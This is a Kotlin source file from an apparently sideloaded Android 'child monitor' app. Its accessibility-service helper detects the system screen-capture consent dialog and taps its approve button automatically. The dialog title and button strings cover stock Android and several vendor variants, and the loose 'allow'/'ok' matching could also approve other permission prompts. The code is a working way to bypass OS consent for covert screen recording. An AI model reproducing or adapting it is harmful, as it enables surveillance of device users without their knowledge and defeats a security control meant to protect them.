package com.childmonitor.accessibility

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo
import android.view.accessibility.AccessibilityWindowInfo
import com.childmonitor.MonitoringPrefs

/**
 * Sideload-only helper: auto-tap Android "Share screen" / "Start now" on the
 * MediaProjection consent dialog when armed by pairing, recovery, or parent stream.
 * Requires Accessibility enabled once at setup.
 */
object MediaProjectionConsentAutomation {

    private const val TAG = "MediaProjAutoApprove"
    private var lastClickAt = 0L
    private var lastScanAt = 0L
    private val loggedUnknownPackages = mutableSetOf<String>()

    /** Android 14+ dialog title — "Start recording or casting with …?" */
    private val DIALOG_TITLE_HINTS = listOf(
        "start recording or casting",
        "recording or casting",
        "will have access to everything",
        "share entire screen",
        // MIUI / HyperOS variants
        "screen recording",
        "capture screen",
        "start capture",
        "screenshot or screen record",
        // Additional Android system variants
        "allow display over other apps",
        "capture everything",
    )

    private val APPROVE_TEXTS = listOf(
        "share screen",
        "start now",
        "start recording",
        "start sharing",
        "share entire screen",
        "start",
        "allow",
        "accept",
        "ok",
        // MIUI / HyperOS Chinese + English
        "立即开始",
        "开始",
        "允许",
        "同意",
        "确认",
        "确定",
        "开始录制",
        "start capture",
        "capture",
    )

    /** System MediaProjection consent UI only — not OEM settings / security center screens. */
    private val DIALOG_PACKAGES = setOf(
        "com.android.systemui",
        "com.google.android.permissioncontroller",
        "com.android.permissioncontroller",
        "com.samsung.android.permissioncontroller",
        "com.oneplus.permissioncontroller",
        "com.oplus.permissioncontroller",
        "com.coloros.permissioncontroller",
        "com.vivo.permissioncontroller",
        // MIUI / HyperOS (Xiaomi) — SystemUI is forked under miui.systemui
        "com.miui.systemui",
        "com.miui.home",
        "com.miui.securitycenter",
        "com.miui.permcenter",
        "com.childmonitor",
    )

    fun tryAutoApprove(service: AccessibilityService, packageName: String?): Boolean {
        if (!MonitoringPrefs.isScreenCaptureAutoApproveArmed(service)) {
            return false
        }

        val now = System.currentTimeMillis()
        if (now - lastClickAt < 1200) return false
        if (now - lastScanAt < 400) return false
        lastScanAt = now

        val roots = collectDialogRoots(service)
        if (roots.isEmpty()) {
            Log.d(TAG, "Armed but no window roots (pkg=$packageName)")
            return false
        }

        var clicked = false
        try {
            val knownPackage = !packageName.isNullOrBlank() && packageName in DIALOG_PACKAGES
            for (root in roots) {
                val looksLikeDialog = knownPackage || looksLikeMediaProjectionDialog(root)
                if (!looksLikeDialog) continue
                if (clickApproveButton(root)) {
                    lastClickAt = now
                    clicked = true
                    Log.i(TAG, "Auto-approved MediaProjection dialog pkg=$packageName")
                    break
                } else {
                    Log.d(TAG, "MediaProjection dialog detected but approve button not found pkg=$packageName")
                }
            }
            if (!clicked && !packageName.isNullOrBlank() && !knownPackage) {
                logUnknownPackageOnce(packageName)
            }
        } finally {
            roots.forEach { it.recycle() }
        }
        return clicked
    }

    /**
     * MediaProjection consent is often a system overlay — not [rootInActiveWindow].
     * Scan all interactive windows (flagRetrieveInteractiveWindows).
     */
    private fun collectDialogRoots(service: AccessibilityService): List<AccessibilityNodeInfo> {
        val roots = mutableListOf<AccessibilityNodeInfo>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val windowList: List<AccessibilityWindowInfo>? = try {
                @Suppress("DEPRECATION")
                service.windows
            } catch (_: Exception) {
                null
            }
            windowList?.forEach { window ->
                if (window.type == AccessibilityWindowInfo.TYPE_APPLICATION ||
                    window.type == AccessibilityWindowInfo.TYPE_SYSTEM
                ) {
                    window.root?.let { roots.add(AccessibilityNodeInfo.obtain(it)) }
                }
            }
        }
        if (roots.isEmpty()) {
            service.rootInActiveWindow?.let { roots.add(it) }
        }
        return roots
    }

    private fun looksLikeMediaProjectionDialog(root: AccessibilityNodeInfo): Boolean {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var sawTitle = false
        var sawApproveHint = false

        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val text = nodeText(node).lowercase()
            if (text.isNotBlank()) {
                for (hint in DIALOG_TITLE_HINTS) {
                    if (text.contains(hint)) {
                        sawTitle = true
                        break
                    }
                }
                for (label in APPROVE_TEXTS) {
                    if (text == label || (label.length >= 5 && text.contains(label))) {
                        sawApproveHint = true
                        break
                    }
                }
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
            if (node !== root) {
                node.recycle()
            }
        }

        return sawTitle || sawApproveHint
    }

    private fun clickApproveButton(root: AccessibilityNodeInfo): Boolean {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var best: AccessibilityNodeInfo? = null
        var bestScore = -1

        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            val text = nodeText(node)
            val className = node.className?.toString().orEmpty()
            val clickable = node.isClickable
            val score = scoreApproveNode(text, className, clickable)
            if (score > bestScore) {
                best?.recycle()
                best = AccessibilityNodeInfo.obtain(node)
                bestScore = score
            }
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { queue.add(it) }
            }
            if (node !== root) {
                node.recycle()
            }
        }

        if (best == null || bestScore < 3) {
            best?.recycle()
            return false
        }

        val target = best!!
        val buttonLabel = nodeText(target)
        val clicked = if (target.isClickable) {
            target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        } else {
            var parent = target.parent
            var ok = false
            while (parent != null) {
                if (parent.isClickable) {
                    ok = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    parent.recycle()
                    break
                }
                val next = parent.parent
                parent.recycle()
                parent = next
            }
            ok
        }
        if (clicked) {
            Log.i(TAG, "Clicked approve button label=\"$buttonLabel\" score=$bestScore")
        }
        target.recycle()
        return clicked
    }

    private fun scoreApproveNode(text: String, className: String, clickable: Boolean): Int {
        if (text.isBlank()) return -1
        val lower = text.lowercase()
        if (lower.contains("cancel") || lower.contains("deny") ||
            lower.contains("拒绝") || lower.contains("取消")
        ) {
            return -1
        }
        var score = 0
        for (label in APPROVE_TEXTS) {
            if (lower == label) {
                score = maxOf(score, when (label) {
                    "share screen" -> 10
                    "start now", "立即开始" -> 8
                    else -> 6
                })
            } else if (label.length >= 5 && lower.contains(label)) {
                score = maxOf(score, 5)
            }
        }
        if (score == 0) return -1
        if (className.contains("Button", ignoreCase = true)) score += 1
        if (clickable) score += 1
        return score
    }

    private fun nodeText(node: AccessibilityNodeInfo): String =
        buildString {
            append(node.text?.toString().orEmpty())
            append(' ')
            append(node.contentDescription?.toString().orEmpty())
        }.trim()

    private fun logUnknownPackageOnce(packageName: String) {
        if (loggedUnknownPackages.add(packageName)) {
            Log.w(
                TAG,
                "Armed but dialog pkg not in allowlist: $packageName " +
                    "(if MediaProjection dialog, add to DIALOG_PACKAGES)",
            )
        }
    }

    fun clearLoggedPackages() {
        loggedUnknownPackages.clear()
    }
}
